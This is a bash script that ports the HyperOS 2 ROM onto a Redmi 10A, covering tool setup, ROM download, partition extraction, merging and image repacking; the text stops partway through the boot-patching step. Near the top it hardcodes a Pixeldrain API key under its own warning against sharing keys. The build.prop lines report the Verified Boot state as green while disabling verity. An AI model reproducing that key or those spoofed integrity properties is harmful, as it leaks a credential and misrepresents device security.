#!/bin/bash
# HYPEROS 2 REDMI 10A - COMPLETE MASTER SUPERSCRIPT
# ONE COMMAND TO PORT EVERYTHING
# Run this once, wait, done!

set -e
set -o pipefail  # belt-and-suspenders: also fail on the first bad command in any pipeline,
                  # in addition to the explicit PIPESTATUS checks added throughout this script

# ============================================================
# CONFIGURATION
# ============================================================

WORK_DIR="/tmp/src/android"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
LOG_FILE="$WORK_DIR/PORT_$TIMESTAMP.log"

# Dedicated venv for payload_dumper's Python deps (set up in setup(), used in extract())
PY_VENV="$WORK_DIR/tools/venv"
PIP="$PY_VENV/bin/pip"
PYTHON="$PY_VENV/bin/python"

# ROM URLs (your provided links)
DONOR_URL="https://bkt-sgp-miui-ota-update-alisgp.oss-ap-southeast-1.aliyuncs.com/OS2.0.215.0.VLHCNXM/pearl-ota_full-OS2.0.215.0.VLHCNXM-user-15.0-8246bfc336.zip"
TARGET_URL="https://bkt-sgp-miui-ota-update-alisgp.oss-ap-southeast-1.aliyuncs.com/V12.5.16.0.RCZMIXM/miui_DANDELIONC3L2Global_V12.5.16.0.RCZMIXM_e004d17bcd_11.0.zip"

# ------------------------------------------------------------
# Pixeldrain upload (optional) — fill in your OWN key below.
#
# SECURITY NOTE: whatever key you put here is now baked into this file.
# Do NOT commit this script to a public repo, paste it into chat, or share
# it anywhere with the key filled in. If you ever do, rotate the key
# immediately at https://pixeldrain.com/user/api_keys — treat it as
# compromised the moment it leaves your machine.
#
# Leave this blank to skip the upload step entirely (it's optional).
# ------------------------------------------------------------
export PIXELDRAIN_API_KEY="aaf6abe7-1625-4b74-ab51-3924ecc4ba88"

# Colors
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

# ============================================================
# LOGGING
# ============================================================

log() {
  echo -e "${GREEN}[$(date +'%H:%M:%S')]${NC} $1" | tee -a "$LOG_FILE"
}

log_section() {
  echo "" | tee -a "$LOG_FILE"
  echo "╔════════════════════════════════════════╗" | tee -a "$LOG_FILE"
  echo "║  $1" | tee -a "$LOG_FILE"
  echo "╚════════════════════════════════════════╝" | tee -a "$LOG_FILE"
  echo "" | tee -a "$LOG_FILE"
}

error() {
  echo -e "${RED}[ERROR]${NC} $1" | tee -a "$LOG_FILE"
  exit 1
}

# ============================================================
# SETUP
# ============================================================

# Installs Android Image Kitchen if missing or incomplete. Safe to call
# repeatedly — checks for the actual required scripts (not just the
# directory), since a prior run that died mid-download/unzip can leave the
# directory present but empty, which would otherwise cause every future run
# to wrongly assume AIK is already installed.
setup_aik() {
  if [ -f "$HOME/tools/AIK/unpackimg.sh" ] && [ -f "$HOME/tools/AIK/repackimg.sh" ]; then
    return 0
  fi

  log "Installing AIK (Android Image Kitchen)..."

  command -v wget &> /dev/null || { log "AIK install failed: 'wget' not found on PATH"; return 1; }
  command -v unzip &> /dev/null || { log "AIK install failed: 'unzip' not found on PATH"; return 1; }

  mkdir -p "$HOME/tools"
  rm -rf "$HOME/tools/AIK" "$HOME/tools/AIK.zip"
  cd "$HOME/tools" || { log "AIK install failed: could not cd into $HOME/tools"; return 1; }

  # NOTE: osm0sis/Android-Image-Kitchen restructured their repo — the
  # `master` branch now contains only Windows .bat scripts. The Linux
  # unpackimg.sh/repackimg.sh live on the separate `AIK-Linux` branch.
  wget -q https://github.com/osm0sis/Android-Image-Kitchen/archive/refs/heads/AIK-Linux.zip -O AIK.zip 2>>"$LOG_FILE"
  if [ $? -ne 0 ]; then
    log "AIK install failed: wget download failed (see $LOG_FILE for details)"
    return 1
  fi

  if [ ! -s AIK.zip ]; then
    log "AIK install failed: downloaded AIK.zip is empty"
    return 1
  fi

  unzip -q AIK.zip 2>>"$LOG_FILE"
  if [ $? -ne 0 ]; then
    log "AIK install failed: unzip of AIK.zip failed (possibly an HTML error page, not a real zip — see $LOG_FILE)"
    return 1
  fi

  # Don't assume the exact folder name — GitHub archive naming can change
  local AIK_EXTRACTED_DIR
  AIK_EXTRACTED_DIR=$(find . -maxdepth 1 -type d -iname "Android-Image-Kitchen-*" | head -n1)
  if [ -z "$AIK_EXTRACTED_DIR" ]; then
    log "AIK install failed: no Android-Image-Kitchen-* directory found after unzip"
    return 1
  fi

  mv "$AIK_EXTRACTED_DIR" AIK
  rm -f AIK.zip

  if [ ! -f AIK/unpackimg.sh ] || [ ! -f AIK/repackimg.sh ]; then
    log "AIK install failed: unpackimg.sh/repackimg.sh missing after extraction — repo layout may have changed"
    return 1
  fi

  chmod +x AIK/unpackimg.sh AIK/repackimg.sh
  log "✓ AIK installed"
  return 0
}

setup() {
  log_section "STEP 1: Setting Up Workspace"
  
  mkdir -p "$WORK_DIR"/{donor,target,output,final_images,tools,scripts,boot_patch}
  
  log "✓ Workspace: $WORK_DIR"
  log "✓ Log file: $LOG_FILE"
  
  # Install tools
  log "Installing required tools..."
  sudo apt update -qq 2>&1 | tail -1

  # NOTE: 'simg2img' is not a real package name on current Ubuntu/Debian repos
  # (it used to ship in 'android-tools-fsutils' on some releases, but nothing
  # later in this script actually calls simg2img — payload_dumper, mkfs.ext4,
  # and loop-mounting are used instead — so it's dropped rather than guessed at).
  sudo apt install -y -qq python3 python3-pip openjdk-11-jdk \
    android-tools-adb android-tools-fastboot \
    p7zip-full unzip zip wget xz-utils brotli e2fsprogs erofs-utils git 2>&1 | tee -a "$LOG_FILE"
  if [ "${PIPESTATUS[0]}" -ne 0 ]; then
    error "apt install failed — check $LOG_FILE for the missing/broken package"
  fi

  # NOTE: modern Debian/Ubuntu ships PEP-668 "externally-managed-environment"
  # Python, which blocks `pip3 install --user` outright. Rather than force it
  # with --break-system-packages (which can fight apt-managed python3 packages),
  # this script uses a dedicated venv for the payload_dumper toolchain.
  command -v python3 &> /dev/null || error "python3 not found after apt install — check log"

  if [ ! -d "$PY_VENV" ]; then
    log "Creating Python virtualenv for tooling..."
    sudo apt install -y -qq python3-venv 2>&1 | tee -a "$LOG_FILE"
    [ "${PIPESTATUS[0]}" -eq 0 ] || error "Failed to install python3-venv"
    python3 -m venv "$PY_VENV" || error "Failed to create virtualenv at $PY_VENV"
  fi

  # From here on, use the venv's pip/python explicitly instead of relying on PATH
  "$PIP" install -q --upgrade pip 2>&1 | tee -a "$LOG_FILE"
  [ "${PIPESTATUS[0]}" -eq 0 ] || error "Failed to upgrade pip inside venv"

  "$PIP" install -q protobuf==3.20.1 brotli pycryptodome bsdiff4 2>&1 | tee -a "$LOG_FILE"
  if [ "${PIPESTATUS[0]}" -ne 0 ]; then
    error "pip install failed inside venv — check $LOG_FILE"
  fi
  
  # payload_dumper
  if [ ! -d "$WORK_DIR/tools/payload_dumper" ]; then
    log "Installing payload_dumper..."
    git clone -q https://github.com/vm03/payload_dumper.git "$WORK_DIR/tools/payload_dumper" \
      || error "Failed to clone payload_dumper repo"
  fi
  # NOTE: always (re)install requirements here, even on repeat runs where the
  # repo dir already exists — a previous run could have cloned it but died
  # before this pip step ran (e.g. mid apt/pip failure), leaving deps like
  # bsdiff4 missing with no visible sign anything was skipped. pip is a no-op
  # for already-satisfied packages, so this is cheap to always run.
  cd "$WORK_DIR/tools/payload_dumper"
  "$PIP" install -q -r requirements.txt 2>&1 | tee -a "$LOG_FILE"
  [ "${PIPESTATUS[0]}" -eq 0 ] || error "Failed to install payload_dumper requirements"
  
  # sdat2img (for block-based OTA ROMs shipped as *.new.dat.br + *.transfer.list,
  # common in MIUI recovery-flashable zips for older non-A/B devices)
  if [ ! -d "$WORK_DIR/tools/sdat2img" ]; then
    log "Installing sdat2img..."
    git clone -q https://github.com/xpirt/sdat2img.git "$WORK_DIR/tools/sdat2img" \
      || error "Failed to clone sdat2img repo"
    [ -f "$WORK_DIR/tools/sdat2img/sdat2img.py" ] || error "sdat2img.py missing after clone"
  fi

  command -v brotli &> /dev/null || error "brotli CLI not found — needed to decompress *.new.dat.br files"

  # AIK
  setup_aik || error "Failed to install AIK — check $LOG_FILE"
  
  log "✓ Setup complete"
}

# ============================================================
# DOWNLOAD
# ============================================================

download() {
  log_section "STEP 2: Downloading ROMs (~4.7 GB total)"
  
  # Try aria2c if available, otherwise wget.
  # NOTE: aria2c and wget take different flags for the output filename
  # ('-o file' + '--allow-overwrite' for aria2c vs '-O file' for wget, which
  # has no equivalent overwrite flag since -O always overwrites). Using the
  # aria2c-style flags with wget would fail immediately, so branch per-tool
  # at call sites instead of sharing one flag string.
  if command -v aria2c &> /dev/null; then
    USE_ARIA2=1
    log "Download tool: aria2c"
  else
    USE_ARIA2=0
    log "Download tool: wget"
  fi

  do_download() {
    local url="$1"
    local outfile="$2"
    if [ "$USE_ARIA2" -eq 1 ]; then
      aria2c -x 16 -k 1M -s 16 --allow-overwrite=true -o "$outfile" "$url" 2>&1 | tee -a "$LOG_FILE"
    else
      wget -q --show-progress -O "$outfile" "$url" 2>&1 | tee -a "$LOG_FILE"
    fi
    return "${PIPESTATUS[0]}"
  }
  
  # Donor
  cd "$WORK_DIR/donor"
  if [ -s hyperos2_pearl.zip ] && unzip -t hyperos2_pearl.zip &> /dev/null; then
    log "✓ Donor ROM already downloaded and valid — skipping"
  else
    log "Downloading HyperOS 2 (Redmi Note 12T Pro)..."
    do_download "$DONOR_URL" "hyperos2_pearl.zip" || error "Donor ROM download failed"
    [ -s hyperos2_pearl.zip ] || error "Donor ROM file is empty/missing after download"
    unzip -t hyperos2_pearl.zip &> /dev/null || error "Downloaded donor file is not a valid zip (bad URL / interrupted download / expired link)"
  fi
  DONOR_SIZE=$(du -sh hyperos2_pearl.zip | cut -f1)
  log "✓ Donor: $DONOR_SIZE"
  
  # Target
  cd "$WORK_DIR/target"
  if [ -s miui_dandelion.zip ] && unzip -t miui_dandelion.zip &> /dev/null; then
    log "✓ Target ROM already downloaded and valid — skipping"
  else
    log "Downloading MIUI 12.5 (Redmi 10a)..."
    do_download "$TARGET_URL" "miui_dandelion.zip" || error "Target ROM download failed"
    [ -s miui_dandelion.zip ] || error "Target ROM file is empty/missing after download"
    unzip -t miui_dandelion.zip &> /dev/null || error "Downloaded target file is not a valid zip (bad URL / interrupted download / expired link)"
  fi
  TARGET_SIZE=$(du -sh miui_dandelion.zip | cut -f1)
  log "✓ Target: $TARGET_SIZE"
  
  log "✓ Downloads complete"
}

# ============================================================
# EXTRACT
# ============================================================

# Extract a partition image's contents into a directory WITHOUT relying on
# loop-mounting (which needs root + kernel loop-device + matching filesystem
# driver support, none of which are guaranteed in a container). Modern Xiaomi
# product/system_ext/mi_ext partitions are commonly EROFS, not ext4 — tries
# EROFS extraction first, falls back to ext4 debugfs, and only tries an
# actual loop mount as a last resort.
extract_partition_image() {
  local img="$1"
  local outdir="$2"
  rm -rf "$outdir"
  mkdir -p "$outdir"

  # NOTE: Android system partitions often contain files (e.g.
  # fs_config_dirs/fs_config_files) with very restrictive mode bits —
  # sometimes 000. If preserved as-is, a later cp -r into these files (e.g.
  # during merge()) fails with "Permission denied" even though we own them.
  # Normalizing to u+rwX right after extraction means every downstream step
  # in this script can freely read/overwrite/rebuild from these files. This
  # only affects our working copy — it doesn't change what ships in the
  # final .img, since mkfs.ext4 -d just uses whatever's on disk at build time.
  normalize_perms() { chmod -R u+rwX "$outdir" 2>/dev/null || true; }

  # Try EROFS first (fsck.erofs --extract reads the image directly, no mount needed)
  if command -v fsck.erofs &> /dev/null; then
    if fsck.erofs --extract="$outdir" "$img" &>> "$LOG_FILE"; then
      if [ -n "$(ls -A "$outdir" 2>/dev/null)" ]; then
        normalize_perms
        return 0
      fi
    fi
  fi

  # Try ext4 via debugfs (reads the image directly, no mount needed)
  if command -v debugfs &> /dev/null; then
    debugfs -R "rdump / $outdir" "$img" &>> "$LOG_FILE"
    if [ -n "$(ls -A "$outdir" 2>/dev/null)" ]; then
      normalize_perms
      return 0
    fi
  fi

  # Last resort: actual loop mount (needs root + matching kernel fs driver)
  local mnt="${img%.img}_mount_tmp"
  mkdir -p "$mnt"
  if sudo mount -o ro,loop "$img" "$mnt" 2>>"$LOG_FILE"; then
    cp -r "$mnt"/* "$outdir"/ 2>/dev/null
    sudo umount "$mnt" 2>>"$LOG_FILE"
    rmdir "$mnt" 2>/dev/null
    if [ -n "$(ls -A "$outdir" 2>/dev/null)" ]; then
      normalize_perms
      return 0
    fi
  fi

  return 1
}

extract() {
  log_section "STEP 3: Extracting ROMs"

  [ -x "$PYTHON" ] || error "Python venv not found at $PY_VENV — run setup() first"

  # Guard against a stale/partially-installed venv from an older run of this
  # script (e.g. one that hit the requirements.txt skip-on-repeat-run bug).
  # This fails with a clear message instead of a raw traceback mid-dump.
  if ! "$PYTHON" -c "import bsdiff4" 2>/dev/null; then
    log "Required Python module (bsdiff4) missing from venv — reinstalling payload_dumper requirements..."
    "$PIP" install -q -r "$WORK_DIR/tools/payload_dumper/requirements.txt" 2>&1 | tee -a "$LOG_FILE"
    [ "${PIPESTATUS[0]}" -eq 0 ] || error "Failed to reinstall payload_dumper requirements"
    "$PYTHON" -c "import bsdiff4" 2>&1 | tee -a "$LOG_FILE" \
      || error "bsdiff4 still not importable in venv after reinstall — check $PY_VENV manually"
  fi
  
  # Donor
  cd "$WORK_DIR/donor"
  if [ -f extracted/partitions/boot.img ] && [ -f extracted/partitions/mi_ext/etc/build.prop ]; then
    log "✓ Donor already extracted — skipping unzip + payload_dumper"
  else
    log "Extracting HyperOS 2..."
    if [ -f extracted/partitions/boot.img ]; then
      log "✓ payload_dumper output already present — skipping re-dump, only re-extracting partition images"
    else
      if [ ! -f payload.bin ]; then
        unzip -o -q hyperos2_pearl.zip || error "Failed to unzip donor ROM"
      fi
      [ -f payload.bin ] || error "payload.bin not found after unzipping donor ROM — check ROM package format"

      "$PYTHON" "$WORK_DIR/tools/payload_dumper/payload_dumper.py" payload.bin --out extracted/partitions/ 2>&1 | tee -a "$LOG_FILE"
      [ "${PIPESTATUS[0]}" -eq 0 ] || error "payload_dumper failed on donor payload.bin — check $LOG_FILE"
      [ -f extracted/partitions/boot.img ] || error "boot.img missing from donor partitions/ after dump — extraction incomplete"
    fi

    cd extracted/partitions/
    for part in mi_ext product system system_ext vendor; do
      if [ -f "${part}.img" ]; then
        extract_partition_image "${part}.img" "${part}" \
          || error "Failed to extract ${part}.img (donor) via EROFS, ext4, and loop-mount — image may be corrupt or an unsupported format"
      fi
    done
    cd "$WORK_DIR/donor"
  fi
  log "✓ Donor extracted"
  
  # Target
  cd "$WORK_DIR/target"
  if [ -f extracted/partitions/vendor.img ] && [ -n "$(ls -A extracted/partitions/vendor 2>/dev/null)" ] \
     && [ -f extracted/partitions/system.img ] && [ -n "$(ls -A extracted/partitions/system 2>/dev/null)" ]; then
    log "✓ Target already extracted — skipping unzip + conversion"
  else
    log "Extracting MIUI 12.5..."
    mkdir -p extracted/partitions

    if [ -f extracted/partitions/vendor.img ] && [ -f extracted/partitions/system.img ]; then
      log "✓ Partition images already produced — skipping re-dump, only re-extracting partition contents"
    else
      if [ ! -f payload.bin ] && [ ! -d images ] && ! ls *.transfer.list &> /dev/null; then
        unzip -o -q miui_dandelion.zip || error "Failed to unzip target ROM"
      fi

      if [ -f payload.bin ]; then
        # A/B (seamless-update) ROM: partitions are packed inside payload.bin
        log "Target ROM format: payload.bin (A/B)"
        "$PYTHON" "$WORK_DIR/tools/payload_dumper/payload_dumper.py" payload.bin --out extracted/partitions/ 2>&1 | tee -a "$LOG_FILE"
        [ "${PIPESTATUS[0]}" -eq 0 ] || error "payload_dumper failed on target payload.bin — check $LOG_FILE"
      elif [ -d images ] && ls images/*.img &> /dev/null; then
        # Legacy fastboot ROM: partitions ship as separate raw .img files under images/
        # (common for older non-A/B devices like dandelion, which has no seamless updates)
        log "Target ROM format: fastboot images/ (non-A/B)"
        cp images/*.img extracted/partitions/ || error "Failed to copy target images/*.img"
      elif ls *.transfer.list &> /dev/null; then
        # Block-based OTA (recovery-flashable) ROM: each partition ships as
        # <part>.new.dat[.br] + <part>.transfer.list (+ empty <part>.patch.dat
        # for incremental-only updates, which is irrelevant for a full ROM).
        # Needs brotli decompression then sdat2img to produce a raw .img.
        log "Target ROM format: block-based OTA (transfer.list/sdat)"
        for tl in *.transfer.list; do
          part="${tl%.transfer.list}"
          datbr="${part}.new.dat.br"
          dat="${part}.new.dat"

          if [ -f "$datbr" ]; then
            log "Decompressing ${datbr}..."
            brotli -d -f "$datbr" -o "$dat" 2>&1 | tee -a "$LOG_FILE"
            [ "${PIPESTATUS[0]}" -eq 0 ] || error "brotli decompression failed for $datbr"
          fi

          if [ -f "$dat" ]; then
            log "Converting $part via sdat2img..."
            "$PYTHON" "$WORK_DIR/tools/sdat2img/sdat2img.py" "$tl" "$dat" "extracted/partitions/${part}.img" 2>&1 | tee -a "$LOG_FILE"
            [ "${PIPESTATUS[0]}" -eq 0 ] || error "sdat2img failed for $part"
          else
            log "⚠ No new.dat payload for $part (likely 0 changed blocks) — skipping"
          fi
        done
      else
        error "No payload.bin, images/*.img, or *.transfer.list found after unzipping target ROM — unrecognized ROM package format. Run 'unzip -l miui_dandelion.zip' to inspect its contents."
      fi

      [ -f extracted/partitions/vendor.img ] || error "vendor.img missing from target partitions/ after extraction — extraction incomplete"
      [ -f extracted/partitions/system.img ] || error "system.img missing from target partitions/ after extraction — needed to merge donor's system_ext content into (this device has no separate system_ext partition — see partition dump)"
    fi

    # Also grab target's own boot.img (+ vbmeta/dtbo, kept for reference).
    # These ship as plain loose files in this ROM's zip, no conversion needed.
    # Using the TARGET's boot.img rather than the donor's is the safer choice
    # here: boot.img is tightly coupled to the SoC's kernel/DTB/boot chain,
    # and donor and target are different chipset families.
    for f in boot.img dtbo.img vbmeta.img vbmeta_system.img vbmeta_vendor.img; do
      [ -f "$f" ] && cp "$f" "extracted/partitions/$f"
    done
    [ -f extracted/partitions/boot.img ] || error "Target boot.img not found in ROM zip — check ROM package contents"

    cd extracted/partitions/
    for part in product system system_ext vendor; do
      if [ -f "${part}.img" ]; then
        extract_partition_image "${part}.img" "${part}" \
          || error "Failed to extract ${part}.img (target) via EROFS, ext4, and loop-mount — image may be corrupt or an unsupported format"
      fi
    done
    cd "$WORK_DIR/target"
  fi
  log "✓ Target extracted"
}

# ============================================================
# MERGE PARTITIONS
# ============================================================

merge() {
  log_section "STEP 4: Merging Partitions"
  
  mkdir -p "$WORK_DIR/output/product/etc" "$WORK_DIR/output/system" "$WORK_DIR/output/vendor"
  
  # build.prop
  log "Merging build.prop..."
  cp "$WORK_DIR/donor/extracted/partitions/mi_ext/etc/build.prop" "$WORK_DIR/output/product/etc/build.prop"
  cat >> "$WORK_DIR/output/product/etc/build.prop" << 'EOF'

# Device Identity (Redmi 10a)
ro.build.product=dandelion
ro.product.device=dandelion
ro.product.name=dandelion
ro.product.model=Redmi 10a
ro.product.board=dandelion
ro.product.manufacturer=Xiaomi
ro.product.brand=Xiaomi
ro.build.version.base_os=V12.5.16.0.RCZMIXM
ro.build.fingerprint=xiaomi/dandelion/dandelion:11/RP1A.200720.011/V12.5.16.0.RCZMIXM:user/release-keys
ro.build.description=dandelion-user 11 RP1A.200720.011 V12.5 release-keys
ro.miui.version_name=V12.5.16.0.RCZMIXM
ro.boot.verifiedbootstate=green
ro.boot.veritymode=disabled
ro.sf.lcd_density=269
EOF
  log "✓ build.prop merged"
  
  # Device features
  log "Remapping device codename (pearl → dandelion)..."
  mkdir -p "$WORK_DIR/output/product/etc/device_features"
  cp "$WORK_DIR/donor/extracted/partitions/product/etc/device_features/pearl.xml" \
     "$WORK_DIR/output/product/etc/device_features/dandelion.xml"
  sed -i 's/pearl/dandelion/g' "$WORK_DIR/output/product/etc/device_features/dandelion.xml"
  log "✓ Device codename remapped"
  
  # displayconfig
  log "Cleaning displayconfig..."
  mkdir -p "$WORK_DIR/output/product/etc/displayconfig"
  cp "$WORK_DIR/donor/extracted/partitions/product/etc/displayconfig"/rhythmic_app_category_list_backup.xml \
     "$WORK_DIR/donor/extracted/partitions/product/etc/displayconfig"/display_id_0.xml \
     "$WORK_DIR/donor/extracted/partitions/product/etc/displayconfig"/resolution_switch_process_list_backup.xml \
     "$WORK_DIR/output/product/etc/displayconfig/" 2>/dev/null || true
  log "✓ displayconfig cleaned"
  
  # Overlays
  # NOTE: per the ZJAOSP MTK port guide, only a specific curated set of
  # overlay APKs should be carried over from the donor — not every overlay
  # in product/overlay/. Blindly copying all of them risks pulling in
  # donor-hardware-specific overlays (camera, fingerprint, chipset-specific
  # UI tweaks) that don't match the target device's actual hardware and can
  # cause crashes/misbehavior at runtime.
  log "Copying framework overlays (curated set)..."
  mkdir -p "$WORK_DIR/output/product/overlay"
  OVERLAY_WHITELIST=(
    "AospFrameworkResOverlay.apk"
    "DevicesAndroidOverlay.apk"
    "DevicesOverlay.apk"
    "MiuiFrameworkResOverlay.apk"
    "MiuiBiometricResOverlay.apk"
  )
  for ov in "${OVERLAY_WHITELIST[@]}"; do
    src="$WORK_DIR/donor/extracted/partitions/product/overlay/$ov"
    if [ -f "$src" ]; then
      cp "$src" "$WORK_DIR/output/product/overlay/"
      log "  + $ov"
    else
      log "  ⚠ $ov not found in donor overlay/ — skipping (may not exist in this HyperOS version)"
    fi
  done
  log "✓ Overlays copied"

  # product/etc/selinux/mapping
  # NOTE: the guide deletes this for product too, same reasoning as
  # system_ext/vendor below — mismatched SELinux policy mapping between
  # donor and target device can cause boot-time policy load failures.
  rm -rf "$WORK_DIR/output/product/etc/selinux/mapping"

  # pangu (HyperOS-specific product container)
  # NOTE: per the guide, HyperOS 2's product partition can include a
  # "pangu" directory holding a nested system/app tree. Its apps need to be
  # relocated to product/app/ directly, then the pangu directory itself
  # removed — otherwise those apps end up missing or misplaced on the
  # target device. Guarded with an existence check since not every donor
  # ROM/version necessarily has this structure.
  PANGU_DIR="$WORK_DIR/donor/extracted/partitions/product/pangu"
  if [ -d "$PANGU_DIR/system/app" ]; then
    log "Relocating pangu/system/app -> product/app..."
    mkdir -p "$WORK_DIR/output/product/app"
    cp -r "$PANGU_DIR/system/app"/* "$WORK_DIR/output/product/app/" \
      || error "Failed to relocate pangu/system/app into product/app"
    log "✓ pangu apps relocated (pangu itself is a donor-side dir and isn't copied into output)"
  else
    log "No pangu/system/app found in donor product partition — skipping (not present in this HyperOS version)"
  fi
  
  # system (base: target's stock system content, with donor's system_ext
  # content merged in as a subfolder)
  #
  # NOTE: this device (confirmed via a live by-name partition dump pulled
  # directly from the phone's recovery) does NOT expose system_ext as its
  # own flashable partition — no /dev/block/.../by-name/system_ext exists
  # anywhere on it. Devices that predate (or never implemented) the
  # system_ext partition split still carry that content logically at
  # /system/system_ext/ *inside* system.img itself — the standard Android
  # convention this falls back to. So instead of building a standalone
  # system_ext.img (which would have nowhere valid to be flashed), donor's
  # system_ext content is merged into a rebuilt system.img under a
  # system_ext/ subfolder, on top of target's own stock system content.
  #
  # Also note: system images can contain files (e.g. fs_config_dirs/
  # fs_config_files) with very restrictive mode bits (sometimes 000) that
  # get preserved by cp. On a re-run, cp can fail with "Permission denied"
  # trying to overwrite an existing destination file it can't open for
  # writing — even though the user owns it. rm can still remove such files
  # (unlink only needs write permission on the *parent* directory), so the
  # destination is cleared first, then normalized to u+rwX afterward.
  log "Building system.img (target base + donor system_ext merged in)..."
  rm -rf "$WORK_DIR/output/system"
  mkdir -p "$WORK_DIR/output/system"
  cp -r "$WORK_DIR/target/extracted/partitions/system"/* "$WORK_DIR/output/system/" \
    || error "Failed to copy target's stock system into output"
  chmod -R u+rwX "$WORK_DIR/output/system"

  rm -rf "$WORK_DIR/output/system/system_ext"
  mkdir -p "$WORK_DIR/output/system/system_ext"
  cp -r "$WORK_DIR/donor/extracted/partitions/system_ext"/* "$WORK_DIR/output/system/system_ext/" \
    || error "Failed to copy donor's system_ext into output/system/system_ext"
  chmod -R u+rwX "$WORK_DIR/output/system/system_ext"
  rm -rf "$WORK_DIR/output/system/system_ext/etc/selinux/mapping"

  mkdir -p "$WORK_DIR/output/system/system_ext/usr/keylayout" "$WORK_DIR/output/system/system_ext/usr/idc"
  cat > "$WORK_DIR/output/system/system_ext/usr/keylayout/accdet.kl" << 'ACCDET'
key 226   HEADSETHOOK
key 230   NOTIFICATION_LED
ACCDET
  cat > "$WORK_DIR/output/system/system_ext/usr/idc/accdet.idc" << 'ACCDET'
touch.deviceType = touchScreen
device.internal = 1
keyboard.layout = accdet
ACCDET
  log "✓ system.img content prepared (stock system + donor system_ext merged)"
  
  # vendor
  log "Copying vendor (Redmi 10a drivers)..."
  rm -rf "$WORK_DIR/output/vendor"
  mkdir -p "$WORK_DIR/output/vendor"
  cp -r "$WORK_DIR/target/extracted/partitions/vendor"/* "$WORK_DIR/output/vendor/" \
    || error "Failed to copy vendor into output"
  chmod -R u+rwX "$WORK_DIR/output/vendor"
  rm -rf "$WORK_DIR/output/vendor/etc/selinux/mapping"
  log "✓ vendor copied"
}

# ============================================================
# REPACK IMAGES
# ============================================================

repack() {
  log_section "STEP 5: Repacking Images as EXT4"
  
  mkdir -p "$WORK_DIR/final_images"

  # NOTE: mkfs.ext4's `-c` flag is a boolean "check for bad blocks" switch —
  # it does NOT take a path argument. The image file path is a positional
  # argument, and when that file doesn't already exist, mkfs.ext4 requires
  # an explicit size (it can't infer one from -d's directory size on its
  # own). So we pre-size the image file ourselves before calling mkfs.ext4.
  build_ext4_image() {
    local src="$1" out="$2" label="$3"
    local size_kb size_mb
    size_kb=$(du -sk "$src" | cut -f1)
    # 25% headroom for filesystem overhead/metadata + future OTA slack,
    # minimum 16MB so tiny partitions still get a workable filesystem
    size_mb=$(( (size_kb * 5 / 4) / 1024 + 16 ))
    log "Sizing ${label}.img at ${size_mb}MB (source content: $((size_kb / 1024))MB)"
    rm -f "$out"
    truncate -s "${size_mb}M" "$out" || error "Failed to allocate $out at ${size_mb}MB"
    mkfs.ext4 -F -L "$label" -T default -b 4096 -d "$src" "$out" 2>&1 | tee -a "$LOG_FILE"
    [ "${PIPESTATUS[0]}" -eq 0 ] || error "mkfs.ext4 failed building ${label}.img"
  }
  
  log "Creating product.img..."
  if [ -f "$WORK_DIR/final_images/product.img" ]; then
    log "✓ product.img already exists — skipping"
  else
    build_ext4_image "$WORK_DIR/output/product" "$WORK_DIR/final_images/product.img" "product"
  fi
  PROD_SIZE=$(du -sh "$WORK_DIR/final_images/product.img" | cut -f1)
  log "✓ product.img ($PROD_SIZE)"
  
  log "Creating system.img..."
  if [ -f "$WORK_DIR/final_images/system.img" ]; then
    log "✓ system.img already exists — skipping"
  else
    build_ext4_image "$WORK_DIR/output/system" "$WORK_DIR/final_images/system.img" "system"
  fi
  SYS_SIZE=$(du -sh "$WORK_DIR/final_images/system.img" | cut -f1)
  log "✓ system.img ($SYS_SIZE)"
  
  log "Creating vendor.img..."
  if [ -f "$WORK_DIR/final_images/vendor.img" ]; then
    log "✓ vendor.img already exists — skipping"
  else
    build_ext4_image "$WORK_DIR/output/vendor" "$WORK_DIR/final_images/vendor.img" "vendor"
  fi
  VEND_SIZE=$(du -sh "$WORK_DIR/final_images/vendor.img" | cut -f1)
  log "✓ vendor.img ($VEND_SIZE)"
}

# ============================================================
# PATCH BOOT
# ============================================================

patch_boot() {
  log_section "STEP 6: Patching Boot Image"

  if [ -f "$WORK_DIR/final_images/boot.img" ]; then
    log "✓ boot.img already patched — skipping"
    return 0
  fi
  
  cd "$WORK_DIR/boot_patch"
  
  [ -f "$WORK_DIR/target/extracted/partitions/boot.img" ] || error "Target boot.img not found — did extract() run successfully?"

  local MKBOOTIMG_DIR="$WORK_DIR/tools/mkbootimg"
  if [ ! -f "$MKBOOTIMG_DIR/unpack_bootimg.py" ] || [ ! -f "$MKBOOTIMG_DIR/mkbootimg.py" ]; then
    log "mkbootimg tools missing — installing..."
    rm -rf "$MKBOOTIMG_DIR"
    git clone -q https://github.com/jbeich/platform_system_tools_mkbootimg.git "$MKBOOTIMG_DIR" 2>&1 | tee -a "$LOG_FILE"
    [ "${PIPESTATUS[0]}" -eq 0 ] || error "Failed to clone mkbootimg tools"
    [ -f "$MKBOOTIMG_DIR/unpack_bootimg.py" ] || error "unpack_bootimg.py missing after clone"
    [ -f "$MKBOOTIMG_DIR/mkbootimg.py" ] || error "mkbootimg.py missing after clone"
  fi

  log "Unpacking boot image..."
  rm -rf unpacked
  "$PYTHON" "$MKBOOTIMG_DIR/unpack_bootimg.py" --boot_img "$WORK_DIR/target/extracted/partitions/boot.img" \
    --out unpacked --format=mkbootimg -0 > mkbootimg_args.raw 2>>"$LOG_FILE"
  [ "${PIPESTATUS[0]}" -eq 0 ] || error "unpack_bootimg.py failed on boot.img — check $LOG_FILE"
  [ -f unpacked/ramdisk ] || error "ramdisk missing from unpack output — boot.img may be a different format (e.g. vendor_boot split)"
  [ -s mkbootimg_args.raw ] || error "unpack_bootimg.py produced no mkbootimg arguments"

  # Read the null-separated arg list into a bash array, preserving any
  # embedded spaces in individual argument values (e.g. board name, cmdline)
  MKBOOTIMG_ARGS=()
  while IFS= read -r -d '' arg; do
    MKBOOTIMG_ARGS+=("$arg")
  done < mkbootimg_args.raw

  log "Extracting ramdisk..."
  rm -rf ramdisk_extracted
  mkdir -p ramdisk_extracted

  # Android ramdisks are usually gzip-compressed cpio archives; detect and
  # decompress accordingly rather than assuming a fixed format.
  RAMDISK_TYPE=$(file -b unpacked/ramdisk)
  case "$RAMDISK_TYPE" in
    *gzip*) zcat unpacked/ramdisk > ramdisk.cpio || error "Failed to gunzip ramdisk" ;;
    *LZ4*|*lz4*) command -v lz4 &> /dev/null && lz4 -d unpacked/ramdisk ramdisk.cpio \
        || error "Ramdisk is LZ4-compressed but 'lz4' CLI is not available — install it or handle manually" ;;
    *cpio*|*ASCII\ cpio*) cp unpacked/ramdisk ramdisk.cpio ;;
